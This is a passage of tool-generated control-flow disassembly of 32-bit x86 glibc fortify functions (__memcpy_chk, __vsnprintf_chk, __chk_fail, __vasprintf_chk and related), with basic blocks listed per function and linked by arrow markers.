0xb0f9553:	jne	0xb0f9521
None
|
|
|
v
0xb0f94f0:	test	al, 2
0xb0f94f2:	jne	0xb0f9524
None
|
|
|
v
0xb0f9555:	jmp	0xb0f9535
None
|
|
|
v
0xb0f9521:	pop	esi
0xb0f9522:	pop	edi
0xb0f9523:	pop	ebp
0xb0f9524:	ret	
None
|
|
|
v
0xb0f9505:	mov	edx, ecx
0xb0f9507:	mov	eax, ecx
0xb0f9509:	and	edx, 0xfffffffd
0xb0f950c:	lock cmpxchg	dword ptr gs:[0x84], edx
0xb0f9515:	cmp	ecx, eax
0xb0f9517:	jne	0xb0f9526
None
|
|
|
v
0xb0f952a:	lea	edi, dword ptr [esi + 0x84]
0xb0f9530:	mov	ebp, 0xf0
0xb0f9535:	mov	eax, ebp
0xb0f9537:	mov	ecx, 0x80
0xb0f953c:	xor	esi, esi
0xb0f953e:	xchg	ebx, edi
0xb0f9540:	int	0x80
None
|
|
|
v
0xb0f94f4:	push	ebp
0xb0f94f5:	push	edi
0xb0f94f6:	push	esi
0xb0f94f7:	mov	esi, dword ptr gs:[8]
0xb0f94fe:	mov	ecx, dword ptr gs:[0x84]
0xb0f9505:	mov	edx, ecx
0xb0f9507:	mov	eax, ecx
0xb0f9509:	and	edx, 0xfffffffd
0xb0f950c:	lock cmpxchg	dword ptr gs:[0x84], edx
0xb0f9515:	cmp	ecx, eax
0xb0f9517:	jne	0xb0f9526
None
|
|
|
v
0xb0f9524:	ret	
None
|
|
|
v
0xb0f9519:	and	ecx, 0xc
0xb0f951c:	cmp	ecx, 4
0xb0f951f:	je	0xb0f952a
None
|
|
|
v
0xb0f9535:	mov	eax, ebp
0xb0f9537:	mov	ecx, 0x80
0xb0f953c:	xor	esi, esi
0xb0f953e:	xchg	ebx, edi
0xb0f9540:	int	0x80
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__memcpy_chk
TOTAL BLOCKS :7
0xb0f9d0c:	lea	eax, dword ptr [ebx - 0x7dcf0]
0xb0f9d12:	test	dword ptr [ebx + 0x3660], 1
0xb0f9d1c:	je	0xb0f9d24
None
|
|
|
v
0xb0f9d1e:	lea	eax, dword ptr [ebx - 0x77ab0]
0xb0f9d24:	pop	ebx
0xb0f9d25:	ret	
None
|
|
|
v
0xb0f9ce0:	push	ebx
0xb0f9ce1:	call	0xb1267db
None
|
|
|
v
0xb0f9cf5:	call	0xb019e10
None
|
|
|
v
0xb0f9d24:	pop	ebx
0xb0f9d25:	ret	
None
|
|
|
v
0xb0f9ce6:	add	ebx, 0xb131a
0xb0f9cec:	cmp	dword ptr [ebx + 0x3620], 0
0xb0f9cf3:	jne	0xb0f9cfa
None
|
|
|
v
0xb0f9cfa:	lea	eax, dword ptr [ebx - 0x12df60]
0xb0f9d00:	test	dword ptr [ebx + 0x3630], 0x200
0xb0f9d0a:	je	0xb0f9d24
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__snprintf_chk
TOTAL BLOCKS :2
0xb0fa287:	add	esp, 0x2c
0xb0fa28a:	ret	
None
|
|
|
v
0xb0fa250:	sub	esp, 0x2c
0xb0fa253:	lea	eax, dword ptr [esp + 0x44]
0xb0fa257:	mov	dword ptr [esp + 0x14], eax
0xb0fa25b:	mov	eax, dword ptr [esp + 0x40]
0xb0fa25f:	mov	dword ptr [esp + 0x10], eax
0xb0fa263:	mov	eax, dword ptr [esp + 0x3c]
0xb0fa267:	mov	dword ptr [esp + 0xc], eax
0xb0fa26b:	mov	eax, dword ptr [esp + 0x38]
0xb0fa26f:	mov	dword ptr [esp + 8], eax
0xb0fa273:	mov	eax, dword ptr [esp + 0x34]
0xb0fa277:	mov	dword ptr [esp + 4], eax
0xb0fa27b:	mov	eax, dword ptr [esp + 0x30]
0xb0fa27f:	mov	dword ptr [esp], eax
0xb0fa282:	call	0xb0fa290
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__vsnprintf_chk
TOTAL BLOCKS :36
0xb0fa4aa:	jmp	0xb0fa3eb
None
|
|
|
v
0xb0fa3f4:	add	dword ptr [edx + 4], 1
0xb0fa3f8:	mov	edx, dword ptr [esp + 0x30]
0xb0fa3fc:	test	edx, edx
0xb0fa3fe:	jle	0xb0fa406
None
|
|
|
v
0xb0fa45c:	add	esp, 0x1c
0xb0fa45f:	mov	eax, edx
0xb0fa461:	pop	ebx
0xb0fa462:	pop	esi
0xb0fa463:	pop	edi
0xb0fa464:	pop	ebp
0xb0fa465:	ret	
None
|
|
|
v
0xb0fa456:	lock sub	dword ptr [ecx], 1
None
|
|
|
v
0xb0fa393:	nop	
0xb0fa395:	nop	
0xb0fa397:	nop	
0xb0fa399:	nop	
0xb0fa39b:	nop	
0xb0fa39d:	nop	
0xb0fa39f:	nop	
0xb0fa3a0:	push	ebp
0xb0fa3a1:	push	edi
0xb0fa3a2:	push	esi
0xb0fa3a3:	push	ebx
0xb0fa3a4:	call	0xb1267db
None
|
|
|
v
0xb0fa3e1:	lock cmpxchg	dword ptr [edx], ecx
0xb0fa3e5:	jne	0xb0fa4a3
None
|
|
|
v
0xb0fa36d:	add	esp, 0x10c
0xb0fa373:	pop	ebx
0xb0fa374:	pop	esi
0xb0fa375:	pop	edi
0xb0fa376:	pop	ebp
0xb0fa377:	ret	
None
|
|
|
v
0xb0fa3a9:	add	ebx, 0xb0c57
0xb0fa3af:	sub	esp, 0x1c
0xb0fa3b2:	mov	edi, dword ptr [ebx - 0x70]
0xb0fa3b8:	mov	esi, dword ptr [edi]
0xb0fa3ba:	mov	eax, dword ptr [esi]
0xb0fa3bc:	and	eax, 0x8000
0xb0fa3c1:	jne	0xb0fa3f8
None
|
|
|
v
0xb0fa2de:	lea	ebp, dword ptr [esp + 0x20]
0xb0fa2e2:	mov	dword ptr [esp + 0x10], 0
0xb0fa2ea:	mov	dword ptr [esp + 0xc], 0
0xb0fa2f2:	mov	dword ptr [esp + 8], 0xffffffff
0xb0fa2fa:	mov	dword ptr [esp + 4], 0x8000
0xb0fa302:	mov	dword ptr [esp], ebp
0xb0fa305:	call	0xb0710c0
None
|
|
|
v
0xb0fa400:	mov	eax, dword ptr [edi]
0xb0fa402:	or	dword ptr [eax + 0x3c], 4
0xb0fa406:	lea	eax, dword ptr [esp + 0x38]
0xb0fa40a:	mov	dword ptr [esp + 8], eax
0xb0fa40e:	mov	eax, dword ptr [esp + 0x34]
0xb0fa412:	mov	dword ptr [esp + 4], eax
0xb0fa416:	mov	eax, dword ptr [edi]
0xb0fa418:	mov	dword ptr [esp], eax
0xb0fa41b:	call	0xb043810
None
|
|
|
v
0xb0fa38e:	call	0xb0faa00
None
|
|
|
v
0xb0fa366:	mov	edx, dword ptr [esp + 0x34]
0xb0fa36a:	mov	byte ptr [edx], 0
0xb0fa36d:	add	esp, 0x10c
0xb0fa373:	pop	ebx
0xb0fa374:	pop	esi
0xb0fa375:	pop	edi
0xb0fa376:	pop	ebp
0xb0fa377:	ret	
None
|
|
|
v
0xb0fa290:	push	ebp
0xb0fa291:	push	edi
0xb0fa292:	push	esi
0xb0fa293:	push	ebx
0xb0fa294:	sub	esp, 0x10c
0xb0fa29a:	mov	ebp, dword ptr [esp + 0x124]
0xb0fa2a1:	call	0xb1267db
None
|
|
|
v
0xb0fa30a:	mov	eax, dword ptr [esp + 0x128]
0xb0fa311:	lea	edx, dword ptr [ebx - 0x920]
0xb0fa317:	mov	dword ptr [esp + 0xb4], edx
0xb0fa31e:	mov	byte ptr [esi], 0
0xb0fa321:	test	eax, eax
0xb0fa323:	jle	0xb0fa32a
None
|
|
|
v
0xb0fa420:	mov	edx, eax
0xb0fa422:	mov	eax, dword ptr [esp + 0x30]
0xb0fa426:	test	eax, eax
0xb0fa428:	jle	0xb0fa430
None
|
|
|
v
0xb0fa3eb:	mov	eax, dword ptr [esi + 0x48]
0xb0fa3ee:	mov	edx, dword ptr [esi + 0x48]
0xb0fa3f1:	mov	dword ptr [eax + 8], ebp
0xb0fa3f4:	add	dword ptr [edx + 4], 1
0xb0fa3f8:	mov	edx, dword ptr [esp + 0x30]
0xb0fa3fc:	test	edx, edx
0xb0fa3fe:	jle	0xb0fa406
None
|
|
|
v
0xb0fa4a3:	lea	ecx, dword ptr [edx]
0xb0fa4a5:	call	0xb0f9430
None
|
|
|
v
0xb0fa445:	mov	dword ptr [ecx + 8], 0
0xb0fa44c:	cmp	dword ptr gs:[0xc], 0
0xb0fa454:	je	0xb0fa457
None
|
|
|
v
0xb0fa4af:	lea	eax, dword ptr [ecx]
0xb0fa4b1:	call	0xb0f9460
None
|
|
|
v
0xb0fa3c3:	mov	edx, dword ptr [esi + 0x48]
0xb0fa3c6:	mov	ebp, dword ptr gs:[8]
0xb0fa3cd:	cmp	ebp, dword ptr [edx + 8]
0xb0fa3d0:	je	0xb0fa3f4
None
|
|
|
v
0xb0fa4b6:	jmp	0xb0fa45c
None
|
|
|
v
0xb0fa3d2:	mov	ecx, 1
0xb0fa3d7:	cmp	dword ptr gs:[0xc], 0
0xb0fa3df:	je	0xb0fa3e2
None
|
|
|
v
0xb0fa43c:	mov	ecx, dword ptr [esi + 0x48]
0xb0fa43f:	sub	dword ptr [ecx + 4], 1
0xb0fa443:	jne	0xb0fa45c
None
|
|
|
v
0xb0fa42a:	mov	eax, dword ptr [edi]
0xb0fa42c:	and	dword ptr [eax + 0x3c], 0xfffffffb
0xb0fa430:	and	dword ptr [esi + 0x3c], 0xffffffeb
0xb0fa434:	test	dword ptr [esi], 0x8000
0xb0fa43a:	jne	0xb0fa45c
None
|
|
|
v
0xb0fa360:	cmp	dword ptr [esp + 0x3c], edi
0xb0fa364:	je	0xb0fa36d
None
|
|
|
v
0xb0fa2c0:	test	ebp, ebp
0xb0fa2c2:	mov	dword ptr [esp + 0x68], 0
0xb0fa2ca:	je	0xb0fa378
None
|
|
|
v
0xb0fa406:	lea	eax, dword ptr [esp + 0x38]
0xb0fa40a:	mov	dword ptr [esp + 8], eax
0xb0fa40e:	mov	eax, dword ptr [esp + 0x34]
0xb0fa412:	mov	dword ptr [esp + 4], eax
0xb0fa416:	mov	eax, dword ptr [edi]
0xb0fa418:	mov	dword ptr [esp], eax
0xb0fa41b:	call	0xb043810
None
|
|
|
v
0xb0fa325:	or	dword ptr [esp + 0x5c], 4
0xb0fa32a:	mov	eax, dword ptr [esp + 0x1c]
0xb0fa32e:	mov	dword ptr [esp + 0xc], esi
0xb0fa332:	mov	dword ptr [esp + 4], esi
0xb0fa336:	mov	dword ptr [esp], ebp
0xb0fa339:	mov	dword ptr [esp + 8], eax
0xb0fa33d:	call	0xb0722d0
None
|
|
|
v
0xb0fa45a:	jne	0xb0fa4af
None
|
|
|
v
0xb0fa3f8:	mov	edx, dword ptr [esp + 0x30]
0xb0fa3fc:	test	edx, edx
0xb0fa3fe:	jle	0xb0fa406
None
|
|
|
v
0xb0fa342:	mov	edx, dword ptr [esp + 0x134]
0xb0fa349:	mov	dword ptr [esp], ebp
0xb0fa34c:	mov	dword ptr [esp + 8], edx
0xb0fa350:	mov	edx, dword ptr [esp + 0x130]
0xb0fa357:	mov	dword ptr [esp + 4], edx
0xb0fa35b:	call	0xb043810
None
|
|
|
v
0xb0fa32a:	mov	eax, dword ptr [esp + 0x1c]
0xb0fa32e:	mov	dword ptr [esp + 0xc], esi
0xb0fa332:	mov	dword ptr [esp + 4], esi
0xb0fa336:	mov	dword ptr [esp], ebp
0xb0fa339:	mov	dword ptr [esp + 8], eax
0xb0fa33d:	call	0xb0722d0
None
|
|
|
v
0xb0fa2d0:	lea	eax, dword ptr [ebp - 1]
0xb0fa2d3:	mov	dword ptr [esp + 0x1c], eax
0xb0fa2d7:	lea	edi, dword ptr [esp + 0xc0]
0xb0fa2de:	lea	ebp, dword ptr [esp + 0x20]
0xb0fa2e2:	mov	dword ptr [esp + 0x10], 0
0xb0fa2ea:	mov	dword ptr [esp + 0xc], 0
0xb0fa2f2:	mov	dword ptr [esp + 8], 0xffffffff
0xb0fa2fa:	mov	dword ptr [esp + 4], 0x8000
0xb0fa302:	mov	dword ptr [esp], ebp
0xb0fa305:	call	0xb0710c0
None
|
|
|
v
0xb0fa378:	lea	edi, dword ptr [esp + 0xc0]
0xb0fa37f:	mov	dword ptr [esp + 0x1c], 0x3f
0xb0fa387:	mov	esi, edi
0xb0fa389:	jmp	0xb0fa2de
None
|
|
|
v
0xb0fa2a6:	add	ebx, 0xb0d5a
0xb0fa2ac:	mov	esi, dword ptr [esp + 0x120]
0xb0fa2b3:	cmp	dword ptr [esp + 0x12c], ebp
0xb0fa2ba:	jb	0xb0fa38e
None
|
|
|
v
0xb0fa430:	and	dword ptr [esi + 0x3c], 0xffffffeb
0xb0fa434:	test	dword ptr [esi], 0x8000
0xb0fa43a:	jne	0xb0fa45c
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__chk_fail
TOTAL BLOCKS :37
0xb0faaa4:	test	ebp, ebp
0xb0faaa6:	je	0xb0faba0
None
|
|
|
v
0xb0faba8:	mov	eax, dword ptr [esp + 0x20]
0xb0fabac:	mov	dword ptr [esp], eax
0xb0fabaf:	call	0xb017470
None
|
|
|
v
0xb0fab51:	cmp	dword ptr [esp + 0x10], edi
0xb0fab55:	jbe	0xb0faaac
None
|
|
|
v
0xb0faa2c:	add	ebx, 0xb05d4
0xb0faa32:	mov	ebp, dword ptr [esp + 0x54]
0xb0faa36:	mov	eax, dword ptr [esp + 0x50]
0xb0faa3a:	add	eax, ebp
0xb0faa3c:	mov	dword ptr [esp + 0x10], eax
0xb0faa40:	lea	eax, dword ptr [ebx - 0x4b01c]
0xb0faa46:	mov	dword ptr [esp + 4], eax
0xb0faa4a:	lea	eax, dword ptr [ebx - 0x4992f]
0xb0faa50:	mov	dword ptr [esp], eax
0xb0faa53:	call	0xb063f60
None
|
|
|
v
0xb0fabc8:	mov	eax, dword ptr [ebx - 0xdc]
0xb0fabce:	mov	edx, dword ptr gs:[0]
0xb0fabd5:	mov	eax, dword ptr [edx + eax]
0xb0fabd8:	cmp	eax, 0xd
0xb0fabdb:	je	0xb0fabb8
None
|
|
|
v
0xb0faa62:	mov	eax, dword ptr [eax]
0xb0faa64:	mov	edx, eax
0xb0faa66:	or	dh, 0x80
0xb0faa69:	test	al, 0x10
0xb0faa6b:	mov	dword ptr [esi], edx
0xb0faa6d:	mov	dword ptr [esp + 0x20], 0
0xb0faa75:	mov	dword ptr [esp + 0x24], 0
0xb0faa7d:	jne	0xb0faba0
None
|
|
|
v
0xb0fab5b:	lea	ecx, dword ptr [edx + 2]
0xb0fab5e:	mov	dword ptr [esp + 0x2c], ecx
0xb0fab62:	cmp	byte ptr [edx + 1], 0x72
0xb0fab66:	jne	0xb0faba0
None
|
|
|
v
0xb0fac01:	sub	ebp, dword ptr [esp + 0x10]
0xb0fac05:	add	ebp, edi
0xb0fac07:	jmp	0xb0faaa4
None
|
|
|
v
0xb0fab85:	test	dl, dl
0xb0fab87:	je	0xb0faaa0
None
|
|
|
v
0xb0fabe2:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb0faa00:	push	ebx
0xb0faa01:	call	0xb1267db
None
|
|
|
v
0xb0fabf5:	test	dl, dl
0xb0fabf7:	jne	0xb0fab98
None
|
|
|
v
0xb0fabb8:	add	esp, 0x3c
0xb0fabbb:	mov	eax, 1
0xb0fabc0:	pop	ebx
0xb0fabc1:	pop	esi
0xb0fabc2:	pop	edi
0xb0fabc3:	pop	ebp
0xb0fabc4:	ret	
None
|
|
|
v
0xb0faaac:	test	byte ptr [esi], 0x10
0xb0faaaf:	jne	0xb0faba0
None
|
|
|
v
0xb0fabdd:	cmp	eax, 2
0xb0fabe0:	je	0xb0fabb8
None
|
|
|
v
0xb0fab8d:	add	ebp, dword ptr [esp + 0x50]
0xb0fab91:	sub	ebp, eax
0xb0fab93:	jmp	0xb0faaa4
None
|
|
|
v
0xb0faadd:	mov	eax, dword ptr [esp + 0x1c]
0xb0faae1:	mov	dword ptr [esp + 8], 0x10
0xb0faae9:	mov	dword ptr [esp + 4], eax
0xb0faaed:	mov	eax, dword ptr [esp + 0x20]
0xb0faaf1:	mov	dword ptr [esp], eax
0xb0faaf4:	call	0xb0346e0
None
|
|
|
v
0xb0fab75:	cmp	edi, dword ptr [esp + 0x50]
0xb0fab79:	setbe	dl
0xb0fab7c:	cmp	eax, dword ptr [esp + 0x10]
0xb0fab80:	setae	cl
0xb0fab83:	jae	0xb0fabf5
None
|
|
|
v
0xb0faab5:	mov	eax, dword ptr [esp + 0x14]
0xb0faab9:	mov	dword ptr [esp + 0xc], esi
0xb0faabd:	mov	dword ptr [esp + 8], 0xa
0xb0faac5:	mov	dword ptr [esp + 4], eax
0xb0faac9:	mov	eax, dword ptr [esp + 0x18]
0xb0faacd:	mov	dword ptr [esp], eax
0xb0faad0:	call	0xb064990
None
|
|
|
v
0xb0fab3b:	lea	ecx, dword ptr [edx + 1]
0xb0fab3e:	mov	dword ptr [esp + 0x2c], ecx
0xb0fab42:	cmp	byte ptr [edx], 0x20
0xb0fab45:	jne	0xb0faba0
None
|
|
|
v
0xb0fab09:	lea	edx, dword ptr [eax + 1]
0xb0fab0c:	mov	dword ptr [esp + 0x28], edx
0xb0fab10:	cmp	byte ptr [eax], 0x2d
0xb0fab13:	jne	0xb0faba0
None
|
|
|
v
0xb0fab68:	lea	ecx, dword ptr [edx + 3]
0xb0fab6b:	mov	dword ptr [esp + 0x2c], ecx
0xb0fab6f:	cmp	byte ptr [edx + 2], 0x2d
0xb0fab73:	jne	0xb0faba0
None
|
|
|
v
0xb0faa83:	lea	eax, dword ptr [esp + 0x24]
0xb0faa87:	mov	dword ptr [esp + 0x14], eax
0xb0faa8b:	lea	eax, dword ptr [esp + 0x20]
0xb0faa8f:	mov	dword ptr [esp + 0x18], eax
0xb0faa93:	lea	eax, dword ptr [esp + 0x28]
0xb0faa97:	mov	dword ptr [esp + 0x1c], eax
0xb0faa9b:	jmp	0xb0faab5
None
|
|
|
v
0xb0fabb4:	test	ebp, ebp
0xb0fabb6:	jne	0xb0fabe8
None
|
|
|
v
0xb0faa1a:	nop	
0xb0faa1c:	nop	
0xb0faa1e:	nop	
0xb0faa20:	push	ebp
0xb0faa21:	push	edi
0xb0faa22:	push	esi
0xb0faa23:	push	ebx
0xb0faa24:	sub	esp, 0x3c
0xb0faa27:	call	0xb1267db
None
|
|
|
v
0xb0faaf9:	mov	edi, eax
0xb0faafb:	mov	eax, dword ptr [esp + 0x28]
0xb0faaff:	cmp	eax, dword ptr [esp + 0x20]
0xb0fab03:	je	0xb0faba0
None
|
|
|
v
0xb0fabe8:	add	esp, 0x3c
0xb0fabeb:	mov	eax, 0xffffffff
0xb0fabf0:	pop	ebx
0xb0fabf1:	pop	esi
0xb0fabf2:	pop	edi
0xb0fabf3:	pop	ebp
0xb0fabf4:	ret	
None
|
|
|
v
0xb0fab31:	mov	edx, dword ptr [esp + 0x2c]
0xb0fab35:	cmp	edx, dword ptr [esp + 0x28]
0xb0fab39:	je	0xb0faba0
None
|
|
|
v
0xb0fab19:	lea	eax, dword ptr [esp + 0x2c]
0xb0fab1d:	mov	dword ptr [esp], edx
0xb0fab20:	mov	dword ptr [esp + 8], 0x10
0xb0fab28:	mov	dword ptr [esp + 4], eax
0xb0fab2c:	call	0xb0346e0
None
|
|
|
v
0xb0fab98:	xor	ebp, ebp
0xb0fab9a:	lea	esi, dword ptr [esi]
0xb0faba0:	mov	dword ptr [esp], esi
0xb0faba3:	call	0xb0634f0
None
|
|
|
v
0xb0faad5:	test	eax, eax
0xb0faad7:	jle	0xb0faba0
None
|
|
|
v
0xb0faaa0:	add	ebp, edi
0xb0faaa2:	sub	ebp, eax
0xb0faaa4:	test	ebp, ebp
0xb0faaa6:	je	0xb0faba0
None
|
|
|
v
0xb0faa06:	add	ebx, 0xb05fa
0xb0faa0c:	sub	esp, 8
0xb0faa0f:	lea	eax, dword ptr [ebx - 0x47c24]
0xb0faa15:	call	0xb0fbb20
None
|
|
|
v
0xb0fab47:	cmp	dword ptr [esp + 0x50], eax
0xb0fab4b:	jae	0xb0faaac
None
|
|
|
v
0xb0fabf9:	test	cl, cl
0xb0fabfb:	je	0xb0faaa0
None
|
|
|
v
0xb0faba0:	mov	dword ptr [esp], esi
0xb0faba3:	call	0xb0634f0
None
|
|
|
v
0xb0faa58:	test	eax, eax
0xb0faa5a:	mov	esi, eax
0xb0faa5c:	je	0xb0fabc8
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__asprintf_chk
TOTAL BLOCKS :2
0xb0fb4a7:	add	esp, 0x1c
0xb0fb4aa:	ret	
None
|
|
|
v
0xb0fb480:	sub	esp, 0x1c
0xb0fb483:	lea	eax, dword ptr [esp + 0x2c]
0xb0fb487:	mov	dword ptr [esp + 0xc], eax
0xb0fb48b:	mov	eax, dword ptr [esp + 0x28]
0xb0fb48f:	mov	dword ptr [esp + 8], eax
0xb0fb493:	mov	eax, dword ptr [esp + 0x24]
0xb0fb497:	mov	dword ptr [esp + 4], eax
0xb0fb49b:	mov	eax, dword ptr [esp + 0x20]
0xb0fb49f:	mov	dword ptr [esp], eax
0xb0fb4a2:	call	0xb0fb4b0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__vasprintf_chk
TOTAL BLOCKS :23
0xb0fb638:	mov	eax, 0xffffffff
0xb0fb63d:	jmp	0xb0fb5c9
None
|
|
|
v
0xb0fb628:	mov	eax, dword ptr [esp + 0x3c]
0xb0fb62c:	mov	dword ptr [esp], eax
0xb0fb62f:	call	0xb017470
None
|
|
|
v
0xb0fb4d1:	test	eax, eax
0xb0fb4d3:	mov	esi, eax
0xb0fb4d5:	je	0xb0fb638
None
|
|
|
v
0xb0fb4b9:	add	ebx, 0xafb47
0xb0fb4bf:	sub	esp, 0xcc
0xb0fb4c5:	mov	dword ptr [esp], 0x64
0xb0fb4cc:	call	0xb0173f0
None
|
|
|
v
0xb0fb5ed:	mov	ebp, dword ptr [esp + 0x3c]
0xb0fb5f1:	mov	dword ptr [esp + 8], esi
0xb0fb5f5:	mov	dword ptr [esp], eax
0xb0fb5f8:	mov	dword ptr [esp + 4], ebp
0xb0fb5fc:	call	0xb07d0b0
None
|
|
|
v
0xb0fb5a6:	mov	eax, dword ptr [esp + 0x3c]
0xb0fb5aa:	mov	dword ptr [esp + 4], ebp
0xb0fb5ae:	mov	dword ptr [esp], eax
0xb0fb5b1:	call	0xb0173e0
None
|
|
|
v
0xb0fb634:	mov	eax, edi
0xb0fb636:	jmp	0xb0fb5c9
None
|
|
|
v
0xb0fb5b6:	mov	ecx, dword ptr [esp + 0xe0]
0xb0fb5bd:	test	eax, eax
0xb0fb5bf:	mov	dword ptr [ecx], eax
0xb0fb5c1:	je	0xb0fb616
None
|
|
|
v
0xb0fb4b0:	push	ebp
0xb0fb4b1:	push	edi
0xb0fb4b2:	push	esi
0xb0fb4b3:	push	ebx
0xb0fb4b4:	call	0xb1267db
None
|
|
|
v
0xb0fb563:	mov	eax, dword ptr [esp + 0xec]
0xb0fb56a:	mov	dword ptr [esp], edi
0xb0fb56d:	mov	dword ptr [esp + 8], eax
0xb0fb571:	mov	eax, dword ptr [esp + 0xe8]
0xb0fb578:	mov	dword ptr [esp + 4], eax
0xb0fb57c:	call	0xb043810
None
|
|
|
v
0xb0fb58b:	mov	eax, dword ptr [esp + 0x30]
0xb0fb58f:	mov	edx, dword ptr [esp + 0x38]
0xb0fb593:	mov	esi, dword ptr [esp + 0x34]
0xb0fb597:	sub	edx, eax
0xb0fb599:	sub	esi, eax
0xb0fb59b:	mov	eax, edx
0xb0fb59d:	lea	ebp, dword ptr [esi + 1]
0xb0fb5a0:	shr	eax, 1
0xb0fb5a2:	cmp	ebp, eax
0xb0fb5a4:	jb	0xb0fb5d8
None
|
|
|
v
0xb0fb581:	test	eax, eax
0xb0fb583:	mov	edi, eax
0xb0fb585:	js	0xb0fb628
None
|
|
|
v
0xb0fb5d8:	mov	dword ptr [esp], ebp
0xb0fb5db:	call	0xb0173f0
None
|
|
|
v
0xb0fb4db:	lea	edi, dword ptr [esp + 0x20]
0xb0fb4df:	mov	dword ptr [esp + 0x10], 0
0xb0fb4e7:	mov	dword ptr [esp + 0xc], 0
0xb0fb4ef:	mov	dword ptr [esp + 8], 0xffffffff
0xb0fb4f7:	mov	dword ptr [esp + 4], 0x8000
0xb0fb4ff:	mov	dword ptr [esp], edi
0xb0fb502:	mov	dword ptr [esp + 0x68], 0
0xb0fb50a:	call	0xb0710c0
None
|
|
|
v
0xb0fb5e0:	mov	ecx, dword ptr [esp + 0xe0]
0xb0fb5e7:	test	eax, eax
0xb0fb5e9:	mov	dword ptr [ecx], eax
0xb0fb5eb:	je	0xb0fb5a6
None
|
|
|
v
0xb0fb616:	mov	eax, dword ptr [esp + 0x3c]
0xb0fb61a:	mov	ecx, dword ptr [esp + 0xe0]
0xb0fb621:	mov	dword ptr [ecx], eax
0xb0fb623:	jmp	0xb0fb5c3
None
|
|
|
v
0xb0fb534:	mov	eax, dword ptr [ebx - 0xf4]
0xb0fb53a:	and	dword ptr [esp + 0x20], 0xfffffffe
0xb0fb53f:	mov	dword ptr [esp + 0xb8], eax
0xb0fb546:	mov	eax, dword ptr [ebx - 0x3c]
0xb0fb54c:	mov	dword ptr [esp + 0xbc], eax
0xb0fb553:	mov	eax, dword ptr [esp + 0xe4]
0xb0fb55a:	test	eax, eax
0xb0fb55c:	jle	0xb0fb563
None
|
|
|
v
0xb0fb5c3:	mov	byte ptr [eax + esi], 0
0xb0fb5c7:	mov	eax, edi
0xb0fb5c9:	add	esp, 0xcc
0xb0fb5cf:	pop	ebx
0xb0fb5d0:	pop	esi
0xb0fb5d1:	pop	edi
0xb0fb5d2:	pop	ebp
0xb0fb5d3:	ret	
None
|
|
|
v
0xb0fb609:	mov	eax, dword ptr [esp + 0xe0]
0xb0fb610:	mov	eax, dword ptr [eax]
0xb0fb612:	test	eax, eax
0xb0fb614:	jne	0xb0fb5c3
None
|
|
|
v
0xb0fb55e:	or	dword ptr [esp + 0x5c], 4
0xb0fb563:	mov	eax, dword ptr [esp + 0xec]
0xb0fb56a:	mov	dword ptr [esp], edi
0xb0fb56d:	mov	dword ptr [esp + 8], eax
0xb0fb571:	mov	eax, dword ptr [esp + 0xe8]
0xb0fb578:	mov	dword ptr [esp + 4], eax
0xb0fb57c:	call	0xb043810
None
|
|
|
v
0xb0fb601:	mov	dword ptr [esp], ebp
0xb0fb604:	call	0xb017470
None
|
|
|
v
0xb0fb5c9:	add	esp, 0xcc
0xb0fb5cf:	pop	ebx
0xb0fb5d0:	pop	esi
0xb0fb5d1:	pop	edi
0xb0fb5d2:	pop	ebp
0xb0fb5d3:	ret	
None
|
|
|
v
0xb0fb50f:	lea	eax, dword ptr [ebx - 0x500]
0xb0fb515:	mov	dword ptr [esp + 0xc], esi
0xb0fb519:	mov	dword ptr [esp + 8], 0x64
0xb0fb521:	mov	dword ptr [esp + 4], esi
0xb0fb525:	mov	dword ptr [esp], edi
0xb0fb528:	mov	dword ptr [esp + 0xb4], eax
0xb0fb52f:	call	0xb0722d0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__fortify_fail
TOTAL BLOCKS :6
0xb0fbb41:	repe cmpsb	byte ptr [esi], byte ptr es:[edi]
None
|
|
|
v
0xb0fbb68:	mov	eax, dword ptr [ebx + 0x35fc]
0xb0fbb6e:	mov	eax, dword ptr [eax]
0xb0fbb70:	mov	dword ptr [esp + 8], ebp
0xb0fbb74:	mov	dword ptr [esp + 4], edi
0xb0fbb78:	mov	dword ptr [esp], esi
0xb0fbb7b:	test	eax, eax
0xb0fbb7d:	cmove	eax, dword ptr [esp + 0x1c]
0xb0fbb82:	mov	dword ptr [esp + 0xc], eax
0xb0fbb86:	call	0xb068d40
None
|
|
|
v
0xb0fbb8b:	jmp	0xb0fbb68
None
|
|
|
v
0xb0fbb20:	push	ebp
0xb0fbb21:	mov	ecx, 5
0xb0fbb26:	push	edi
0xb0fbb27:	mov	ebp, eax
0xb0fbb29:	push	esi
0xb0fbb2a:	mov	esi, eax
0xb0fbb2c:	push	ebx
0xb0fbb2d:	call	0xb1267db
None
|
|
|
v
0xb0fbb32:	add	ebx, 0xaf4ce
0xb0fbb38:	sub	esp, 0x2c
0xb0fbb3b:	lea	edi, dword ptr [ebx - 0x48b61]
0xb0fbb41:	repe cmpsb	byte ptr [esi], byte ptr es:[edi]
None
|
|
|
v
0xb0fbb43:	lea	edi, dword ptr [ebx - 0x47ba5]
0xb0fbb49:	seta	al
0xb0fbb4c:	setb	dl
0xb0fbb4f:	sub	eax, edx
0xb0fbb51:	movsx	eax, al
0xb0fbb54:	cmp	eax, 1
0xb0fbb57:	sbb	esi, esi
0xb0fbb59:	lea	eax, dword ptr [ebx - 0x4982f]
0xb0fbb5f:	add	esi, 2
0xb0fbb62:	mov	dword ptr [esp + 0x1c], eax
0xb0fbb66:	nop	
0xb0fbb68:	mov	eax, dword ptr [ebx + 0x35fc]
0xb0fbb6e:	mov	eax, dword ptr [eax]
0xb0fbb70:	mov	dword ptr [esp + 8], ebp
0xb0fbb74:	mov	dword ptr [esp + 4], edi
0xb0fbb78:	mov	dword ptr [esp], esi
0xb0fbb7b:	test	eax, eax
0xb0fbb7d:	cmove	eax, dword ptr [esp + 0x1c]
0xb0fbb82:	mov	dword ptr [esp + 0xc], eax
0xb0fbb86:	call	0xb068d40
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0fbb90
TOTAL BLOCKS :13
